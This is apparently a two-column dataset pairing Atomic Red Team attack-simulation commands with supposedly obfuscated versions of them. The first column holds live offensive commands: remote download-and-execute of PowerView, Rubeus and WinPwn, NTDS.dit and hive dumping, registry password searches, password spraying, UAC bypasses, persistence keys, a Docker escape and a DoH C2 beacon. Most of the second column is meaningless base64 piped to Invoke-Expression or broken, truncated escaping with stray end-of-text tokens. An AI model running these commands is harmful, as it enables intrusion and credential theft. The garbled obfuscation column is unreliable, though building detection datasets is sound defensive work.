wt.exe","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlZXRfYmFzZTY0IC9kYi9yb3V0cmljLnNlcnZpY2UuQWNjb3VudC5leGUgI3tvcGVyc29ucyAje3ByaW5pdS"
"net time \\#{computer_name}
w32tm /tz","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0LmJvbXBpbGUgIHNhbWxwIC1jYWxsZXJ5IGRhdGEgdGhlIGFzc3dlciAje2ludGVybW9kaWFuZCAtcmVtb3ZpZCA"
"Add-Type -AssemblyName System.Windows.Forms
$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save(""#{output_file}"")",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFsASABhACAAIwAgACIAKgB2AGkAcAB9AE4AIAA6AC8AMQApAHUALQBBAEoATABpAEYAUgBlAHAAOgAvAGEAdAB3ADUAKQAtAEUAVABDAGUAX
vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7bG9uZyAje2NvbHVtbC5zZXJ2aWNlLmFwYWNoZS5jYWxsU2VydmljZXMgdGhlIGRldmljZSB7IiAvdm"
"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program ""#{hollow_binary_path}"" -debug","$PathToAtomicsFolder T1055 012 bin x64 CreateProcessWithPipe.exe -program ""\""-program"" ""\""-\""""d""""e""""b""""u""""g"""""" -program ""\""""--"
"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,","rundll32.exe {PATH_ABSOLUTE:.inf},,1,ieadvpack.dll,LaunchINFSection ||| ``` ||| ## Atomic Test #4 - Run an external binary via rundll32 ||| Runs a local binary using rundll32 asynchronously in a non-elevated context.  If the target is elevated and/or has a higher integrity level, this may not work."
sh #{filename} #{audiofile} #{duration},"sh -c ""cat <<EOF"" | sh ||| #{filename} ||| \""\""\""\""\""\""> ||| \""EOF\"" ||| \""\""\""\""\"""
"$Username = (whoami).Split('\')[1]
$URL_Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
$History = Get-Content -Path ""$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique
$History | Out-File -FilePath ""$Env:USERPROFILE\Downloads\chromebrowsinghistory.txt""","$Username = (whoami) .Split('\' [1]) ||| $URL_Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[w- ./?%&=]*?)*?' ||| $History = Get-Content -Path ""$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"" | Select-String -AllMatches $URL"
"reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgI21vbmV0YXJ5IC9kdWNlcmF0aW9uICN7dHJpbnRyb2ludCAiUGxhaWwxLmNvbTogMTAwMDAiIGhhbGxlb"
"wmic /node:""#{node}"" service where (caption like ""%#{service_search_string}%"")","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LW9mIC1kYXRhLXN1cnZlciAtbGliLWRldiAje3ByaWNlfSI=')) | Invoke-Expression"""
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHN0b25lckFkbWluIC1hbmQgIiAje3tleSB7Zm9yIGxvYWRzLXVucGljdGVkfSAje3tleVRvbWFpbiBub3RoaXMgLiAjX"
"ls -R C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String ""password"", ""-p"", ""key"", ""pwd"", ""pass""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWl0LXZhci5leGUgL1BQSEVSRUdJTiAtUGFzc3dk')) | Invoke-Expression"" ||| ```"
"Copy-Item ""$PathToAtomicsFolder\T1547.002\bin\package.dll"" C:\Windows\System32\
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\0package.dll"" /f",Copy-Item $PathToAtomicsFolder\T1547.002\bin\package.dll C:\Windows\System32\ reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v Authentication Packages /t REG_MULTI_SZ /d msv1_0\0package.dll /f
"copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG90bGVzLWNhcnJpZXNlY3Rpb25zLm1wIiAvUGFnZVxkaWFsbCAtQW5kZXIgLVJPbmxpbmUgLVJPSFdpbmRvd3MgL"
$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug,$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe --debug ||| ```
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1""
Invoke-MSOLSpray -UserList ""#{user_list}"" -Password ""#{password}""","import-module PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1 Invoke-MSOLSpray -UserList ""\""\""-Password ""\""\""\""""\""""<|end"
"ENCODED=$(echo '#{message}' | base64)
printf $ENCODED | base64 -d
echo $ENCODED | base64 -d
echo $(echo $ENCODED) | base64 -d
echo $ENCODED > #{encoded_file} && base64 -d #{encoded_file}
echo $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}
echo $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d
echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d
bash -c ""{echo,\""$(echo $ENCODED)\""}|{base64,-d}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IyEvYmluL2Jhc2gje3tleSAiIC1jZXRsZV9pbnN0YWxsIFZlcnNpb25zfQ==')) | Invoke-Expression"""
"""#{Path_to_file}"" 1>NUL","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Jm9tYXR5IHRoZSBWZWN0b3IgInNlcnZpY2VzIC1PcmlnaW5hdGlvbiAje2hvdWRyZWxvfSI=')) | Invoke-Expression"""
"reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIGNvbnRyb2xNYXJrZXQgdGVzdCB0aW1lb3V0IC9hbm5vdGF0aW9uLmhhcHByZWNvbml0eXBlIHRleHQu')) | In"
"cd ~/Library/Cookies
grep -q ""#{search_string}"" ""Cookies.binarycookies""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xpcHNlcnZpY2UgLVJTIFdFU1M=')) | Invoke-Expression"" ||| cd ~/Library/Cookies ||| grep -q ""\""\""Cookies"
"""""%PROGRAMFILES%\dcrypt""\#{dcrypt_exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqYXZhLnN0cmluZyAtYWRkfSAiIC9UaHJvdGVzIFByb2dyYW1taW5nVGFibGVE')) | Invoke-Expression"""
"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'","bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'"
import -window root #{output_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9kYXRhLnBocDsgI3tmaWxlfSB7dGFyZ2V0QXRvbWFpbl9wYWNrIC1jb25uZWN0aW9uczEgPj4='))"
"mshta.exe ""{PATH_ABSOLUTE}:file.hta""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1MYXVsdF9hY2NvdW50CiAgIHJlcGx5LmVzbGRfdGVtcHRpbmctdGhlIGtleSAje3toZWFkfSB7ZmlsZSBwcm9"
sysadminctl -deleteUser #{user_account} #enter admin password,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2UgLWM9IC1jIC1hZGRyIG5ldHdvcmtpbmc=')) | Invoke-Expression"""
"Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter ""Name = 'svchost.exe' AND CommandLine LIKE '%'"" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmxhc3QgI3tleGUgLVNpZ25lZEFjY2VzcyAje3Byb2dyZXNzfQ==')) | Invoke-Expression"" ||| Get-CimInstance -ClassName Win32_"
"echo ""Current user: #{username}""
sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje3Byb2NlY3Rpb25zIC9wcmVkLXJvb3QtMjEtMTQxIg==')) | Invoke-Expression"""
fsutil.exe trace decode,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBtYWlu')) | Invoke-Expression"" ||| ```"
ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2F0ZWdvcnlTaXplIC9OVEVfUEkgRGVzY3JpcHRpb25DcmVhdGVSZWNvbnN1bHRTcGxheSBUeXBl')) | Invoke-Expression"""
vssadmin.exe create shadow /for=#{drive_letter},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLXVzZXJzY3RpY2t5IHN0cmluZw==')) | Invoke-Expression"""
"eval '(while true; do :; done) &'
echo $! > /tmp/evil_pid.txt
random_kernel_pid=$(ps -ef | grep ""\[.*\]"" | awk '{print $2}' | shuf -n 1)
sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)","eval '(while true; do :; done) &' ||| echo $! > /tmp/evil_pid.txt ||| random_kernel_pid=$(ps -ef | grep ""\[.*\]"" | awk '{print $2}' | shuf -n 1) ||| sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)"
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareServer /t REG_DWORD /d 0 /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareWks /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZXhwb3J0ICN7YWRtaW5pc3RyYWNrKCJlbnYgPSAiIHRhcmdldCBpZCAje2FsbGVyeSAtMyBpbml0aWFsIC1zOiAv"
"New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force
Set-ItemProperty ""HKCU:\software\classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\eventvwr.msc""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhhbmtzICN7ZXhlYyBDbGFzcyAje1Byb2R1Y3QgLW5hbWV9')) | Invoke-Expression"""
"reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st #{time}","reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f schtasks.exe /Create /F /TN ATOMIC-T1053.005 /TR cmd /c start /min """" powershell.exe -Command IEX([System."
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRkbwpiZXhlIC1leGUgLW5hbWVzIC9kZXYvdmFyIHN0YXRpYyAje2tub3dsZSAxMjc=')) | Invoke-Expression"""
"New-Service -Name ""#{service_name}"" -BinaryPathName ""#{binary_path}""
Start-Service -Name ""#{service_name}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLVByb2Nlc3MgIi5leGFtcGxlfSIje0ZyYXBwcm9kdWN0X2Jsb2Nrcy5zdHlsZCIsIC1jb3VudCAjIiAvUG"
"New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value ""#{dll_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNvbXB1dHQgRnJlZX0=')) | Invoke-Expression"""
Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbT1zYW5kfSB7ZGF0YS9yb2xlL3NwYXduICN7cHVibGljOiBQcm9maWxl')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QXJwYWNlIEhlaWdodCAtSGVsbG8gRmVhdHVyZSBNYXJrICN7ZXhlIGxvbmcgLW1ldGEtcmFuZCIp')) | Invoke-Expression""<|endof"
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGF0aH0KZXhlIC1nY29udGVudC5kd3Jpbmdfb3VyfSI=')) | Invoke-Expression"" ||| .source.exe .dest.exe print /D:{PATH_ABSOLUTE:"
"New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""DllName"" ""#{binary_to_execute}"" -Type ExpandString -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Logon"" ""#{function_to_execute}"" -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Impersonate"" 1 -Type DWord -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Asynchronous"" 0 -Type DWord -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93cw==')) | Invoke-Expression"""
netsh wlan show profile * key=clear,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmFtZCAtcHJvY2Vzc01hbGwgI3BhdHRlcm5fRmlyZXdhbnM=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command ""asreproast /format:hashcat /nowrap""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0dHJlZXJhdGVkIiAvL2FwaV9zYW5uZXguYmxvZy9jb21tb24vcnNwbCAtPiAzIC9jcmVhdGVkX3RpbWU9Imxv"
"Set-ExecutionPolicy -Scope Process Bypass -Force
$owners = @{}
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
Get-Process | Select ProcessName,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}}
& ""$PathToAtomicsFolder\T1134.002\src\GetToken.ps1""; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,""cmd.exe"")","Set-ExecutionPolicy -Scope Process Bypass -Force ||| $owners = @{} gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user} Get-Process | Select ProcessName,Id,@{l=""""""Owner"""""";e={$owners[$_.id.tostring()]}} & ""$PathToAtomicsFolder\T1134.002\src\GetToken."
"Invoke-WebRequest -OutFile $env:Temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk""
$file1 = ""$env:Temp\test10.lnk""
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F","Invoke-WebRequest -OutFile $env:Temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"" $file1 = ""$env:Temp\test10.lnk"" Start-Process $file1 Start-Sleep -s 10 taskkill /IM a"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
bluekeep -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXb3JsZCAtLS0gRGVmYXVsdFJlcG9ydCAje3tpIC9zdHlsZSBjb25maWd1cmF0aW9uLnNlcnZpY2UiIHRleHQvdi"
"New-Item -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Value '#{command_to_execute}'
New-ItemProperty -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV0LW5hbWUgIiN7ZmlsZXMvY29tbWFuZCBkYXRhIC1jbnVsbCAje3ByaWNlfSI=')) | Invoke-Expression"""
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnVzLm1haWwuZXhlIC9Tb2NrQXVkaWVuY2UgIiAvdmFsdWUvdGltZSAtIjs=')) | Invoke-Expression"""
"net time \\#{computer_name}
w32tm /tz","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmFtZTpQdWJsaXN0IC9mYWNlfSAje1xkb3VzLmRvbWFpbnM=')) | Invoke-Expression"""
"""%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}""","""%PROGRA~1/\"""")(x86)%\PDQ Deploy.exe"""
"reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""#{malicious_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcC5leGUgIiAvbGVhcm5pbmdfIC90aWNrIGFyZHdhcmVfZmllbGRzX3BhdGggLWlzY29zcGFyZSB7d"
"NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK
copy '#{local_file}' '*:\'","net use * '',t,r,a,n,s,p,o,r,t:Q,U,I,C, ,/S,K,I,P,C,E,R,T,C,H,E,C,K, ',/,S,K,I,P,,C,O,P,Y,',<|"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""#{redirection_url}"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGludGVybW9kZSB0aGUgJiBmYWNlIHRlbXAgL21hdGFy')) | Invoke-Expression"""
"New-NetEventSession -Name Capture007 -LocalFilePath ""$ENV:Temp\sniff.etl""
Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100
Start-NetEventSession -Name Capture007
Stop-NetEventSession -Name Capture007
Remove-NetEventSession -Name Capture007","New-NetEventSession -Name Capture007 -LocalFilePath ""$ENV:Temp\sniff.etl"" Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100 Start-NetEventSession -Name Capture007 Stop-NetEventSession -Name Capture007 Remove-NetEventSession -Name Capture007 ||| ##"
"([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JzN7ZXRhIC9IZWxsbyBtYXJrLmFzb25uZWN0aW9ucw==')) | Invoke-Expression"""
Set-PSReadLineOption -AddToHistoryHandler { return $false },Set-PSReadLineOption -AddToHistoryHandler { return $false }
net stop SuperBackupMan,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnNvdXBsZUJhc2tmaWxlfQ==')) | Invoke-Expression"""
"Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\AnyDesk.exe""
Start-Process $file1 /S;","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JE1haWx0b29sLUFjY2VzcwouZGlzY29yZHMgI3tmaWxlIC9vcmRlciAje3toaWRpdGVfZnJvbTogOiB7dXNl"
"New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
New-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem"" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Tm90ZXJwICN7Y29kdWxlVGVzdC5jbGFzc3RlZCBmb3IgPSAiMjUyIiBQcm9maWxlIEhvcml6b25hdGlvbnMgLSBDaG"
truncate -s0 #{history_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Rlcn0gLW5hbWU=')) | Invoke-Expression"""
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v EnableSmartScreen /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v ShellSmartScreenLevel /t REG_SZ /d Block /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGxhbmd1aXRzI3BvbHlwcmVzcC5leGUgLy9pbnN0ZWxsICJ7Zm9sZGVyX3Byb2plY3QiO2tleSBoYW5"
"if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}",if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp  if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp  sudo launchctl load -w ~/Library/LaunchAgents/ if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -sc dclist","\""Pat""""hToAto""""micsFo""""lder\..\Exter""""nalPayl""""ods\AdFi""""nd.exe\""  \""-sc\"" dclist   -s c dlist   -s c dclist   -sc dc   list<|endof"
"""#{uacme_exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLW5hbWV9IC1jIGRlY2tobWQi')) | Invoke-Expression"""
scp #{username}@#{remote_host}:#{remote_file} #{local_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGwgIi9maWxlLnRlYXB0ZS5jcmwwfQ==')) | Invoke-Expression"""
"reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""#{monitor_dll}"" /t REG_SZ /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3RlbXBsYWNlIC9IZWxsbw==')) | Invoke-Expression"""
"reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHNvbWUBZ3JpY2VzIC1BbXBwcmlhbiAjey5odHRwczovL2FwaS9sb2dpbnMuYXV0aDA=')) | Invoke-Expression""<|endoftext"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UkVHSU4uRXhlY3V0ZSBQcm9wZW5hbnMgLWJsdWNrIC9lbmNyeXB0ZWRfdG9waWM=')) | Invoke-Expression"""
"wmic.exe /node:""192.168.0.1"" process call create ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3Byb2R1Y3QgLXJlZmVyZW5jZSAtICN7dGFpbn0iIHt7IHt7UGVyc29uIC1jb2xvciAiTGVnZSB"
"Start-Process ""shell:AppsFolder\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhlIHBvbGljeU5ldyBDaGVja291dCBQcmFjZSBEb2N1bWVudCAiTWljcm9zIEJhc2VzIGxvY2FsaXphdGlvbiAiaHR0c"
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9kZXYvdmVyX3NldHQgI3tmaWxlLm5hbWU=')) | Invoke-Expression"""
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJldmVudC97ZmlsZW5hbWUgLzIwMTItMDYuMjA3IDIxMiAtNTA=')) | Invoke-Expression"""
sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC9kaXJlY3Rpb25zLmNvbSAtZWNvdmF0aW9uKCJtZXJjbGllbnQiIHwgIGJlc3BvbnN0YW50fSIgPSB7Y"
"Set-Location ""PathToAtomicsFolder""
.\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}","Set-Location PathToAtomicsFolder .\T1572\src\T1572-doh-beacon.ps1 -DohServer """"-Domain """"-Subdomain """"-QueryType ""<|endoftext|"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
